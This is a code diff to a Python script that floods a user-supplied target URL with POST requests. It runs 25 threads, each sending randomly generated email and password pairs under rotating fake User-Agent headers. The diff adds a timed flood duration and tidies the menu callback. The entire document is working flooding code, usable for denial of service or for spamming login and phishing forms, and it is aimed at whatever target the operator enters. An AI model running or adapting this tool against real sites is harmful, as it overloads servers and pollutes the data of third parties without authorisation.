@@ -29,39 +29,31 @@ def generate_random_email():
 def generate_random_password():
     return ''.join(random.choice(string.ascii_letters + string.digits) for _ in range(8))
 
-def send_posts(url):
-    while True:
+def send_posts(url, floodlength):
+    start_time = time.time()
+    while time.time() - start_time < floodlength:
         email = generate_random_email()
         password = generate_random_password()
         data = {"a": email, "az": password}
         ua = UserAgent()
         user_agent = ua.random
         headers = {'User-Agent': user_agent}
-        response = requests.post(url, data=data, headers=headers,)
+        response = requests.post(url, data=data, headers=headers)
         print(f"Email: {email}, Password: {password}, Status Code: {response.status_code}, headers: {user_agent}")
 
 def pkmain(callback):
     url = input("Enter the URL of the target you want to flood: ")
-    length = int(input("\nEnter time in seconds you want to flood: "))
-    threads = [threading.Thread(target=send_posts, args=(url,), daemon=True) for _ in range(25)]
+    floodlength = int(input("\nEnter time in seconds you want to flood: "))
+    threads = [threading.Thread(target=send_posts, args=(url,floodlength), daemon=True) for _ in range(25)]
 
     for t in threads:
         t.start()
 
+    time.sleep(floodlength)
+
     for t in threads:
         t.join()
 
-    time.sleep(length)
-
-    print("\n")
-    print("\n")
-    print("\n")
     print("Flood complete.  Back to menu...")
     time.sleep(3)
     callback()
-
-def exit():
-    exit()
-    
-if __name__ == "__main__":
-    pkmain(exit)
